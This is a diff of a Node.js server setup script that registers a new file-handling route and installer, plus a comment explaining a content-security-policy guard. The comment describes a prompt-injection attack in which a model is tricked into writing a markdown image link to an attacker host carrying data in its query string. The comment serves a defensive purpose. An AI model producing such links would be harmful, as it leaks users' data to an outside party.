@@ -13,7 +13,7 @@ patch(
 patch(
   "/app/api/server/index.js",
   "  app.use('/api/auth', preAuthTenantMiddleware, routes.auth);",
-  "  app.use('/api/internal/warehouse-user', require('/app/kai-platform/routes.cjs').internalWarehouseRouter);\n  app.use('/activate-account', require('/app/kai-platform/routes.cjs').activationRouter);\n  app.use('/api/kai-jobs', require('/app/kai-platform/routes.cjs').jobsRouter);\n  app.use('/api/auth', preAuthTenantMiddleware, routes.auth);",
+  "  app.use('/api/internal/warehouse-user', require('/app/kai-platform/routes.cjs').internalWarehouseRouter);\n  app.use('/activate-account', require('/app/kai-platform/routes.cjs').activationRouter);\n  app.use('/api/kai-jobs', require('/app/kai-platform/routes.cjs').jobsRouter);\n  app.use('/api/kai-files', require('/app/kai-platform/routes.cjs').filesRouter);\n  app.use('/api/auth', preAuthTenantMiddleware, routes.auth);",
 );
 // Prompt-injection exfiltration guard: a model tricked into writing ![](https://attacker/?d=<data>) would make the
 // browser send data out on render. Browsers enforce every CSP header, so this extra img-src policy holds alongside
@@ -50,3 +50,4 @@ await (await import("./install_managed_agents.mjs")).installManagedAgents();
 await (await import('./install_account_security.mjs')).installAccountSecurity();
 await (await import('./install_binding_acl.mjs')).installBindingACL();
 await (await import('./install_agent_duplication.mjs')).installAgentDuplication();
+await (await import('./install_file_notice.mjs')).installFileNotice();
